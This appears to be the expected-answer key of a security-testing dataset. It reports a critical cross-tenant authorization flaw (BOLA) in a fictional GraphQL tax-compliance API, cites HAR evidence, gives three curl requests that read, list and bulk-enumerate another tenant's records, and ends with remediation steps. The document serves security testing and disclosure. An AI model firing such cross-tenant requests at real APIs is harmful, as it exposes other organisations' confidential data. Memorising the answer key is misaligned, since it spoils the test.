# Expected Response

## System
- Domain: Tax Compliance / RegTech
- System: TaxGrid Compliance API
- Example ID: GQL-0048

## Priority Findings

### Finding 1: Multi-Tenant BOLA — Resolver Trusts Client-Supplied tenantId Instead of JWT (Pattern 1.5)
**Severity:** Critical
**Category:** BOLA / Multi-Tenant Access

**Summary:**
The TaxGrid Compliance API trusts the client-supplied `tenantId` parameter in GraphQL queries rather than extracting it from the validated JWT. Per §5.0: "Token from `tenant-f137` passes `tenantId: 'tenant-8db9'` to access cross-tenant data." The `getResource` resolver returns tax compliance records belonging to `tenant-8db9` to an attacker from `tenant-f137`, exposing sensitive tax filing data. No server-side tenant isolation is enforced at the resolver level.

**Evidence from HAR:**
- Request: `POST https://api.taxgrid-compliance-a.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-f137` — attacker's identity
- Query payload: `getResource(id: "R-2048") { resourceId tenantId ownerId data { sensitiveField internalNotes } }` — cross-tenant tax record accessed
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-8db9` — victim's tax compliance data
- Response `ownerId`: `other-user-f1378db9`
- Response `sensitiveField`: `CONFIDENTIAL-f1378db9`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-f1378db9`

**Root Cause (§4.0 RISK-GQL-048 + §5.0):** Resolver trusts client-supplied `tenantId` filter; the JWT's `tenantId` claim is not used as the authoritative boundary.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-048 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.5 | "Token from tenant-f137 passes tenantId: 'tenant-8db9' to access cross-tenant data" |
| HAR entry | request.postData | `getResource(id: "R-2048")` from `tenant-f137` |
| HAR entry | response.content | `tenantId: "tenant-8db9"`, `sensitiveField: "CONFIDENTIAL-f1378db9"` |

---

## Steps to Reproduce

### Step 1 — Cross-tenant data access (HAR attack)
```bash
curl -s -X POST https://api.taxgrid-compliance-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-f137" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2048\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-8db9"`, `sensitiveField: "CONFIDENTIAL-f1378db9"` — cross-tenant tax data.
**Secure outcome:** HTTP 403 or FORBIDDEN.

### Step 2 — Cross-tenant list via client-supplied tenantId
```bash
curl -s -X POST https://api.taxgrid-compliance-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-f137" \
  -d '{"query": "query { listResources(tenantId: \"tenant-8db9\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns `tenant-8db9` tax compliance records.
**Secure outcome:** FORBIDDEN.

### Step 3 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.taxgrid-compliance-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-f137" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2048\", \"R-8db9-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns tax records from `tenant-8db9`.

## Remediation
1. **Use JWT-derived tenantId exclusively:** Never accept `tenantId` as a client argument in resolvers — extract from JWT claims.
2. **Resolver tenant guard on getResource:** `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
3. **Per-ID ownership filter in bulkResourceLookup.**
4. **Redis cache key includes tenantId.**
